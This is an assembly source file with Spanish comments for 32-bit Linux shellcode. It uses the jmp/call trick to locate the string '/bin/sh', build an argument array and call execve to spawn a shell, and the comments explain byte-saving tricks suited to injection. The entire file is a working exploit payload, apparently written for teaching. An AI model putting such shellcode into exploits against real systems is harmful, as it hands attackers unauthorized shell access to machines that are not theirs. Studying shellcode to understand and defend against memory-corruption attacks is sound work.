BITS 32                 ;Indicamos a nasm que genere un codigo para una arquitectura de 32 bits
section .text
global _start

_start:
jmp short texto         ;Aqui Â­empieza el jmp/call trick. Salta a texto. Ahorramos un byte con el 'short'.
code:
pop ebx                 ;Ponemos en ebx la direccion donde se encuentra '/bin/sh'. Sera el primer argumento de la syscall.
xor eax, eax            ;Ponemos a 0 el registro eax    
cdq                     ;Ponemos a 0 el registro edx gracias a que eax es 0. Nos ahorramos un byte.
mov byte [ebx+7], al    ;Ponemos un null-byte al final de la cadena /bin/sh.
mov [ebx+8], ebx        ;A continuacion de la cadena, almacenamos la direccion de la misma cadena
mov byte [ebx+12], al   ;A continuacion de los 4 bytes de la direccion, almacenamos un byte nulo
lea ecx, [ebx+8]        ;En ecx almacenamos la direccion donde se almacena la direccion a /bin/sh
mov al, 11              ;En eax ponemos el valor de la execve syscall. Trabajando con al nos ahorramos un byte.
int 0x80                ;Ejecutamos la syscall.
texto:
call code               ;Llamamos a code. En la pila se almacena la direccion donde se encuentra '/bin/sh'.
db '/bin/sh'
